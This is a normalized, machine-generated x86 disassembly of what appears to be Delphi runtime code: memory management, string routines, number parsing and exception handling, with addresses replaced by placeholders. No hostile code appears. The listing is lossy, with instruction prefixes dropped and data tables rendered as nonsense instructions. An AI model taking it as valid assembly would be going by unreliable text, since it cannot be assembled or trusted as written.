sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401f08
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401c18
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_40200c
test al al
je r-xdata
call sub_401c18
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401cdc
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401e80
jmp r-xdata
sub_402670
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_402721
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a74
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_402494
test al al
je r-xdata
push rw-data
call sub_4013d0
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_402160
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_402930
mov eax ebx
call sub_4022f0
retn
push rw-data
call sub_4013d8
sub_402734
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_402890
sub_402754
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_402890
sub_402774
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402890
mov [ ecx ] eax
mov al 0x2
jmp sub_402890
retn
mov [ ecx ] eax
retn
sub_402804
push ebx
push esi
call sub_405e8c
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_405e8c
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_405e8c
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_402844
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_405e8c
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_402838
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_4028cc
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_402930
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_4029bc
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_4028bc
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_402a10
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_4028bc
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_4028bc
jmp r-xdata
sub_402a68
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_402930
pop ebx
retn
mov ecx ebx
sub_402a84
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402b08
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402b78
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402b98
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402c78
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402cb8
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402d6b ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402d6b ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402d6b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_402fa4
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_402fd4
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_40132c
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_403045
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_401334
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_401324
retn
sub_4030c8
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_403170
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_4031c8
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_4048cc
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_4031e8
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_405774
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_403218
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_40329c
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_4032ac
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4032a3
lea eax [ ebp - 0x8 ]
call sub_40575c
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_4031e8
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_405774
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_4032ac
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_4032f0
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_403378
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_403330
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_403360
push eax
push ecx
mov eax [ eax ]
call sub_403330
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403e90
call [ rw-data ]
sub_4033a8
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_403330
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_4033d0
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_403420
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_403470
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_403499
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_403504
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_403540
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403554
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403568
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_403588
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_403568
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_4035ec
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_403098
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_405e8c
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_403554
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_403504
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_403718
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_403098
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_403504
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_405e8c
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_403540
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402b08
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_4038a0
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_403588
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_4038d8
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_403e90
sub_403900
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_405e8c
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_403164
call sub_4034e8
sub_403954
call sub_405e8c
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_403164
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_4035b0
jmp edx
sub_40399c
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_402838
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403afc
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403b24
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403b6a
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
